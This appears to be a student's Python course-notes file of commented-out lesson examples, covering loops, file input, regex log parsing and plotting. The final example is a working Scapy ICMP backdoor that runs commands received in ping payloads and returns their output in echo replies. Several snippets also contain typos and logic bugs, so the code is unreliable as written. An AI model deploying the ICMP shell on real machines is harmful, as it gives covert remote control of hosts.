#!/usr/bin/env/python3

# Challenge in Module 2 minute 19 and Module 2 Lesson 1 Operator Refresher Examples
'''
mysongwords = ['this', 'song', 'repeats']
counter = int(len(mysongwords))+1
for word in mysongwords:
    print(word)
    counter = counter - 1
if counter == 0 or counter < 2:
    for word in mysongwords:
        print(word)
'''
# Challenge in Module 2 minute 38
'''
mystring = "FOo00BaRz"
for char in mystring:
    if char.isupper() == True:
        print("This is a CAPITAL LETTER: " + str(char))
    if char.islower() == True:
        print("This is a lowercase letter: " + str(char))
    else:
        print(str(char) + ' is not an alphabet char')
'''
# Module 2 Lesson 1 Standard Input and File Operations Example 1 "nano hello-world.py"
'''
print('my first hello world program...')
userinput = input("please enter your name: ")
print('hello' + ' ' + userinput)
'''
# Module 2 Lesson 1 Example 2 "my SECOND hello world program..."
'''
print('my SECOND hello world program...')
myfile = open('user-input.txt', 'r')  # read local file

print('printing original contents of file...')
print(myfile.read())  # read the entire contents of the file and print it
print('printing object type of myfile..')
print(type(myfile))  # useful for debugging object syntax requirements

# close the file handle before another read operation type
myfile.close()

# re-open so it isn't clobbered in memory
myfile = open('user-input.txt', 'r')  # read local file
lines_of_myfile = myfile.readlines()  # read the file line by line instead
# print('printing object type of myfile...')
# print(type(myfile))  # useful for debugging object syntax requirements
# print(lines_of_file)
sorted_lines = sorted(lines_of_myfile)
print(sorted_lines)

# something nicer to look at
for i in sorted_lines:  # note the semi colon
    print(i)  # add a tab NOT spaces to indent this print line
'''
# Module 2 Lesson 1 Conversion and Manipulation Example 3 "Strings"
'''
myvariable = 10
type(myvariable)
myvariable * 2
myvariable = '10'
myvariable * 2
int(myvariable) * 2
float(myvariable) * 2
myvariable = ['10', 10, 10.0, 'end of list']
print(myvariable[0])
print(myvariable[3])
type(myvariable[3])
type(myvariable[0])
type(myvariable[2])
'''
# Module 2 Lesson 1 Operator Refresher Examples Example 1
'''
score = int(input('Enter a number between 0-10 for Dennis: '))
if (score > 5) and (score >= 0):
    print("Dennis is a below average instructor :-(")
elif (score > 5) and (score >= 0):
    print("Dennis is just plaine average")
elif score == 5:
    print("Dennis is just plain average")
else:
    print("Smart alec student")
'''
# Module 2 Lesson 2 Common Modules "Time" Example 2
''''
import time
mytimelimit = int(10)
while mytimelimit:
    mytimelimit = mytimelimit - 1
    time.sleep(1)
    print("seconds left " + str(mytimelimit))
print('time is up')
'''
# Module 2 Lesson 2 Regular Expression Refresh Example 3
'''
from colorama import Fore
from collections import Counter
import re
import json
file = open('log.txt', 'r')
srcipaddrlist = []
dstipaddrlist = []
srcportlist = []
dstportlist = []
protolist = []
for i in file:
    # regex findall method will return a list based your expression
    # use negative look ahead to negate match a group which is surrounded by ()
    srcipaddr = re.findall(r'(?:SRC=)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', i)
    dstipaddr = re.findall(r'(?:DST=)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', i)
    srcport = re.findall(r'(?:SPT=)(\d{1,5})', i)
    dstport = re.findall(r'(?:DPT=)(\d{1,5})', i)
    # print(srcipaddr[0])
    # specify the first element to remove nested list and ensure result is not empty
    if len(srcipaddr) > 0:
        srcipaddrlist.append(srcipaddr[0])
    if len(dstipaddr) > 0:
        dstipaddrlist.append(dstipaddr[0])
    if len(srcport) > 0:
        srcportlist.append(srcport[0])
    if len(dstport) > 0:
        dstportlist.append(dstport[0])

# Use Counter method to calculate unique values into counter obj convert to dictionary kv pairs
# print(srcipaddrlist)
srcipdict = dict(Counter(srcipaddrlist))
dstipdict = dict(Counter(dstipaddrlist))
srcportdict = dict(Counter(srcportlist))
dstportdict = dict(Counter(dstportlist))

# Convert KV dictionary pairs to json readable format
srcipjson = json.dumps(srcipdict, indent=4)
dstipjson = json.dumps(dstipdict, indent=4)
srcportjson = json.dumps(srcportdict, indent=4)
dstportjson = json.dumps(dstportdict, indent=4)

# Chow skittle JSON taste the rainbow
print(Fore.RED + "***Source IP Unique Hits***: ")
print(srcipjson)

print(Fore.BLUE + "***Source Port Unique Hits***: ")
print(srcportjson)

print(Fore.YELLOW + "***Dest IP Unique Hits***: ")
print(dstipjson)

print(Fore.GREEN + "***Dest Port Unique Hits***: ")
print(dstportjson)

file.close()
'''
# Module 2 Lesson 2 Math, Numpy, and MatPlotLib Example 4
'''
# find area of circle less accurate
pi_value = 3.14
radius_value = float(input('enter radius of circle: '))
area_value = pi_value * radius_value ** 2
print(area_value)

# more accurate
import math
radius_value = float(input('enter radius of circle: '))
area_value = math.pi * radius_value ** 2
print(area_value)
'''
# Module 2 Lesson 2 "matplotlib-example" Example 5
'''
# import libraries

# Creating dataset
import matplotlib.pyplot as pltimport numpy as np
a = np.random.randint(100, size =(50))

# Creating plot
fig = plt.figure(figsize=(10, 7))
plt.hist(a, bins=[0, 10, 20, 30,
                  40, 50, 60, 70,SU
                  80, 90, 100])
plt.title("Numpy Histogram")
# show plot
# plt.show()
# save plot
plt.savefig('nox11-server-histogram.png')
'''
# Module 2 Lesson 2 "Example findings with this base code:" Example 6

# Nested Function using Scapy to Parse Input and Respond

'''
def shellfoo(pkt):
    # scapy uses pythons raw string vs. regular string
    if Raw in pkt[ICMP]:
        # keep original pkt values
        src = pkt[IP].src
        dst = pkt[IP].dst
        id = pkt[ICMP].id
        seq = pkt[ICMP].seq
        cmd = pkt[ICMP].payload
        # execute shell command nested function

        def shellcmd(input):
            # cheater way to strip out scapys raw string
            strcmd = str(cmd).replace('b\'', '').replace(
                '\n', '').replace('\\\\', '\\').rstrip('\x00').rstrip('\'')
            print("Printing scrubbed command entered: ")
            print(strcmd)
            # return os.system(strcmd) #(dont use only returns std out on console)
            return os.popen(strcmd).readline()
            # return check_output([strcmd], shell=True) #abs path required and an exception blocking function

        retsh = shellcmd(cmd)
        #resp = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/str(retsh)
        resp = IP(src=dst, dst=src)/ICMP(type=0,
                                         id=id, seq=seq)/Raw(load=retsh)
        print("printing shell cmd output:")
        print(resp[Raw])

        # frag the packet for large shell returns like dir and ipconfig
        frags = fragment(resp, 1460)
        x = 0  # counter
        for i in frags:
            x = x+1
            print("Sending packet " + str(x))
            send(resp)
        # send(resp)


# BPF filter for icmp only up to 10 packet count
sniff(iface="Intel(R) Dual Band Wireless-AC 8265",
      prn=shellfoo, filter="icmp", count=10)
'''
